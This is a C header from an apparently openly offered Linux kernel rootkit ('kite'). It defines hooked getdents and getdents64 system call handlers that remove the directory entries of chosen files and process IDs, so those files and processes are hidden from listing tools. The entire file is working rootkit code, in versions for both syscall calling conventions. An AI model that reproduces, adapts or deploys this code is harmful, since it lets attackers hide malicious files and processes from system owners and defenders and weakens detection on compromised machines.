#ifndef GET_DENTS_KITE
    #define GET_DENTS_KITE

    #include "kite_init.h"
    #include "device_handler.h"

    #include <linux/dirent.h>
    #include <linux/uaccess.h>// copy to/from user space

#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_getdents64(const struct pt_regs *regs){
    // get the dirent pointer in user space from the register
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(regs);// get the original function's return value (size of dirent record)
    dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program

    // check if empty directory or not enough space to allocate
    if((ret <= 0) || ( dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret); // get the dirent itself from the user space in dirent address
    if(error){
        goto done;
    }

    while (offset < ret) // until reached full dirent record length
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of dirent is a file we want to hide or a pid we want to hide
        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0)){
            // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen; // set record length minus the matched dirent
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //move record start to the second dirent
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record to make system skip to next one
        }
        else
        {
            previous_dir = current_dir; // if not matched, progress
        }
        
        offset += current_dir->d_reclen; // incriment offset to next dirent

    }
    
    error = copy_to_user(dirent, dirent_ker, ret); // copy the new dirents record to user dirent pointer in user space
    if(error){
        goto done;
    }

    done:
        kfree(dirent_ker); // free the allocated space for dirent record
        return ret; // return size of returned record
}

static asmlinkage int hack_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of dirent is a file we want to hide or a pid we want to hide
        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

    done:
        kfree(dirent_ker);
        return ret;

}
#else
static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    // get the dirent pointer in user space from the register

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(fd, dirent, count);// get the original function's return value (size of dirent record)
    dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program

    // check if empty directory or not enough space to allocate
    if((ret <= 0) || ( dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret); // get the dirent itself from the user space in dirent address
    if(error){
        goto done;
    }

    while (offset < ret) // until reached full dirent record length
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of dirent is a file we want to hide or a pid we want to hide
        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0)){
            // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen; // set record length minus the matched dirent
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //move record start to the second dirent
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record to make system skip to next one
        }
        else
        {
            previous_dir = current_dir; // if not matched, progress
        }
        
        offset += current_dir->d_reclen; // incriment offset to next dirent

    }
    
    error = copy_to_user(dirent, dirent_ker, ret); // copy the new dirents record to user dirent pointer in user space
    if(error){
        goto done;
    }

    done:
        kfree(dirent_ker); // free the allocated space for dirent record
        return ret; // return size of returned record
}

static asmlinkage int hack_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);


    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of dirent is a file we want to hide or a pid we want to hide
        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

    done:
        kfree(dirent_ker);
        return ret;

}
#endif
#endif